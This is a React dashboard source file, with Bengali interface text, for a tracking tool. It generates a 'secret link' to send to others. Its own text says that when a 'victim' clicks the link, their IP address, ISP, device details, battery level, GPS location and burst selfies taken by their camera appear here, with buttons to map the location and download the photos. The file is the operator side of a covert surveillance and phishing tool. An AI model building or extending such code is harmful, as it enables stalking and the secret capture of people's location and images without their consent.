
import React, { useState, useEffect } from 'react';
import { User, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
import { collection, query, where, onSnapshot, doc, getDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
import { auth, db } from '../firebase';
import { useNavigate } from 'react-router-dom';

interface LogEntry {
  id: string;
  timestamp: any;
  device?: {
    name: string;
    userAgent: string;
    ram: any;
    cores: any;
    screen: string;
  };
  battery?: { level: number; charging: boolean };
  location?: { 
    lat: number; 
    lng: number; 
    altitude?: number; 
    speed?: number; 
    heading?: number;
    accuracy?: number;
  };
  photoUrls?: string[];
  ip?: string;
  isp?: string;
  city?: string;
  status: string;
}

const Dashboard: React.FC<{ user: User }> = ({ user }) => {
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [loading, setLoading] = useState(true);
  const [profile, setProfile] = useState<any>(null);
  const [selectedPhotos, setSelectedPhotos] = useState<string[] | null>(null);
  const [copySuccess, setCopySuccess] = useState(false);
  const navigate = useNavigate();
  
  const baseUrl = window.location.origin + window.location.pathname;
  const trackerLink = `${baseUrl}#/trk/${user.uid}`;

  useEffect(() => {
    if (!db) return;

    const fetchProfile = async () => {
      const docRef = doc(db, "users", user.uid);
      const docSnap = await getDoc(docRef);
      if (docSnap.exists()) setProfile(docSnap.data());
    };
    fetchProfile();

    const q = query(collection(db, "logs"), where("userId", "==", user.uid));
    const unsubscribe = onSnapshot(q, (snapshot) => {
      const data = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() })) as LogEntry[];
      data.sort((a, b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0));
      setLogs(data);
      setLoading(false);
    });

    return () => unsubscribe();
  }, [user.uid]);

  const handleSignOut = () => { signOut(auth); navigate('/login'); };
  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopySuccess(true);
    setTimeout(() => setCopySuccess(false), 2000);
  };

  const downloadImage = (url: string, index: number) => {
    const link = document.createElement('a');
    link.href = url;
    link.download = `selfie_${index}_${Date.now()}.jpg`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  return (
    <div className="min-h-screen bg-slate-50 font-['Hind_Siliguri'] pb-20">
      <nav className="bg-white border-b border-gray-100 px-6 py-4 flex justify-between items-center sticky top-0 z-50 shadow-sm">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center shadow-lg shadow-blue-200">
            <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
          </div>
          <h1 className="text-xl font-bold text-gray-800">অ্যাডমিন ড্যাশবোর্ড</h1>
        </div>
        <button onClick={handleSignOut} className="bg-red-50 text-red-600 font-bold text-sm px-5 py-2.5 rounded-xl hover:bg-red-600 hover:text-white transition-all">লগ আউট</button>
      </nav>

      <main className="max-w-7xl mx-auto p-4 md:p-8 space-y-8">
        <div className="bg-gradient-to-r from-blue-700 to-indigo-800 p-8 rounded-3xl text-white shadow-2xl relative overflow-hidden">
           <div className="relative z-10">
              <h2 className="text-2xl font-bold">স্বাগতম, {profile?.fullName || 'ইউজার'}</h2>
              <p className="mt-2 text-blue-100 opacity-80">আপনার সকল ট্র্যাকিং রিপোর্ট এখানে রিয়েল-টাইমে দেখতে পাবেন।</p>
           </div>
           <svg className="absolute top-0 right-0 w-64 h-64 text-white opacity-5 -mr-20 -mt-20" fill="currentColor" viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
        </div>

        <div className="bg-white p-8 rounded-3xl shadow-sm border border-gray-100">
          <h3 className="text-lg font-black text-gray-800 mb-4">আপনার সিক্রেট লিংক</h3>
          <div className="flex flex-col md:flex-row gap-3">
            <input readOnly value={trackerLink} className="flex-1 bg-gray-50 px-4 py-4 rounded-xl border border-gray-200 font-mono text-sm text-blue-600" />
            <button onClick={() => copyToClipboard(trackerLink)} className="bg-blue-600 text-white px-8 py-4 rounded-xl font-bold hover:bg-blue-700 transition-all">{copySuccess ? "কপি হয়েছে!" : "লিংক কপি"}</button>
          </div>
        </div>

        <div className="grid grid-cols-1 gap-6">
          {logs.length === 0 ? (
            <div className="bg-white p-20 text-center rounded-3xl border border-dashed border-gray-200">
               <div className="w-16 h-16 bg-gray-50 rounded-full flex items-center justify-center mx-auto mb-4">
                  <svg className="w-8 h-8 text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
               </div>
               <p className="text-gray-400 font-bold">এখনো কোনো ডাটা পাওয়া যায়নি। ভিক্টিম লিংকে ক্লিক করলে এখানে দেখা যাবে।</p>
            </div>
          ) : (
            logs.map((log) => (
              <div key={log.id} className="bg-white rounded-3xl shadow-lg border border-gray-100 overflow-hidden hover:border-blue-200 transition-all">
                <div className="p-6 md:p-8 flex flex-col md:flex-row gap-8">
                  <div className="md:w-1/3 space-y-4">
                    <div className="flex items-center gap-4">
                       <div className="w-12 h-12 bg-blue-50 rounded-2xl flex items-center justify-center text-blue-600 font-bold">
                          {log.device?.name?.charAt(0) || 'D'}
                       </div>
                       <div>
                          <p className="text-xs font-bold text-gray-400 uppercase">Device Name</p>
                          <h4 className="font-black text-gray-800">{log.device?.name || 'Unknown Device'}</h4>
                       </div>
                    </div>
                    
                    <div className="grid grid-cols-2 gap-4">
                       <div className="bg-gray-50 p-3 rounded-2xl">
                          <p className="text-[10px] text-gray-400 font-bold uppercase">Battery</p>
                          <p className="font-bold text-green-600">{log.battery ? `${log.battery.level}%` : 'N/A'}</p>
                       </div>
                       <div className="bg-gray-50 p-3 rounded-2xl">
                          <p className="text-[10px] text-gray-400 font-bold uppercase">Network</p>
                          <p className="font-bold text-blue-600 truncate text-[10px]">{log.isp || 'N/A'}</p>
                       </div>
                    </div>

                    <div className="bg-slate-900 p-4 rounded-2xl text-white">
                       <p className="text-[10px] text-gray-400 font-bold uppercase mb-1">Public IP Address</p>
                       <p className="font-mono text-sm font-bold text-blue-400">{log.ip}</p>
                       <p className="text-[10px] text-gray-500 mt-2">Time: {log.timestamp?.toDate().toLocaleString('bn-BD')}</p>
                    </div>
                  </div>

                  <div className="md:w-2/3 flex flex-col justify-between gap-6">
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                       <button onClick={() => setSelectedPhotos(log.photoUrls || [])} className="flex items-center justify-center gap-2 bg-blue-50 text-blue-700 font-bold py-4 rounded-2xl hover:bg-blue-600 hover:text-white transition-all">
                          <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z" /><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z" /></svg>
                          View Selfies ({log.photoUrls?.length || 0})
                       </button>
                       <a href={log.location ? `https://www.google.com/maps?q=${log.location.lat},${log.location.lng}` : '#'} target="_blank" className={`flex items-center justify-center gap-2 font-bold py-4 rounded-2xl transition-all ${log.location ? 'bg-green-50 text-green-700 hover:bg-green-600 hover:text-white' : 'bg-gray-100 text-gray-300 cursor-not-allowed'}`}>
                          <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z" /><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" /></svg>
                          {log.location ? 'View Loc (Live Map)' : 'GPS Blocked'}
                       </a>
                    </div>
                    
                    <div className="bg-gray-50 p-4 rounded-2xl">
                       <p className="text-[10px] text-gray-400 font-bold uppercase mb-2">Detailed Device Signature</p>
                       <p className="text-[10px] font-mono text-gray-500 break-all leading-relaxed">{log.device?.userAgent}</p>
                    </div>
                  </div>
                </div>
              </div>
            ))
          )}
        </div>

        {/* Photo Gallery Modal */}
        {selectedPhotos && (
          <div className="fixed inset-0 z-[100] bg-slate-900/90 backdrop-blur-sm flex items-center justify-center p-4">
            <div className="bg-white w-full max-w-4xl rounded-3xl overflow-hidden shadow-2xl">
               <div className="p-6 border-b border-gray-100 flex justify-between items-center">
                  <h3 className="text-xl font-black text-gray-800">Burst Selfies (4 Frames)</h3>
                  <button onClick={() => setSelectedPhotos(null)} className="text-gray-400 hover:text-gray-800">
                    <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12" /></svg>
                  </button>
               </div>
               <div className="p-6 grid grid-cols-2 md:grid-cols-4 gap-4">
                  {selectedPhotos.length > 0 ? selectedPhotos.map((url, i) => (
                    <div key={i} className="group relative rounded-2xl overflow-hidden border-4 border-gray-50">
                       <img src={url} className="w-full aspect-[3/4] object-cover" />
                       <div className="absolute inset-0 bg-blue-600/60 opacity-0 group-hover:opacity-100 transition-all flex items-center justify-center">
                          <button onClick={() => downloadImage(url, i)} className="bg-white text-blue-600 p-3 rounded-full shadow-lg">
                             <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16v1a2 2 0 002 2h12a2 2 0 002-2v-1m-4-4l-4 4m0 0l-4-4m4 4V4" /></svg>
                          </button>
                       </div>
                    </div>
                  )) : <p className="col-span-full text-center py-20 text-gray-400 font-bold">কোনো ছবি ক্যাপচার করা সম্ভব হয়নি।</p>}
               </div>
               <div className="p-6 bg-gray-50 text-center">
                  <button onClick={() => setSelectedPhotos(null)} className="bg-slate-800 text-white px-10 py-3 rounded-xl font-bold">বন্ধ করুন</button>
               </div>
            </div>
          </div>
        )}

        <footer className="text-center py-10">
           <p className="text-xs font-bold text-gray-400 uppercase tracking-widest">Global Device Intelligence Engine</p>
           <p className="text-sm mt-1 text-gray-300">Developed by <span className="font-black text-blue-600/50">Arefin Foysal</span></p>
        </footer>
      </main>
    </div>
  );
};

export default Dashboard;
